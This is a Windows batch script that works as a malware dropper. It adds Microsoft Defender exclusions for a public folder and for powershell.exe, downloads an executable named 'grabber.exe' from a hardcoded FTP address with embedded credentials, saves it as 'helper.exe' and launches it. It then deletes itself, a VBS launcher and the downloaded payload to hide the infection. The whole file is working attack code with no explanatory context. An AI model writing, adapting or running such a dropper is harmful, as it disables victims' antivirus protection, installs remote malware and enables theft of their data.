@echo off
powershell Add-MpPreference -ExclusionPath "C:\Users\Public"
powershell Add-MpPreference -ExclusionProcess "powershell.exe"
cd "C:\Users\Public"
curl -p --insecure  "ftp://73.93.11.94/grabber.exe" --user "ftp-server:ftp-server" -o "C:\Users\Public\helper.exe" --ftp-create-dirs  >nul 2>&1 
start helper.exe
del hide.vbs
timeout 5
del helper.exe
del dependencies.bat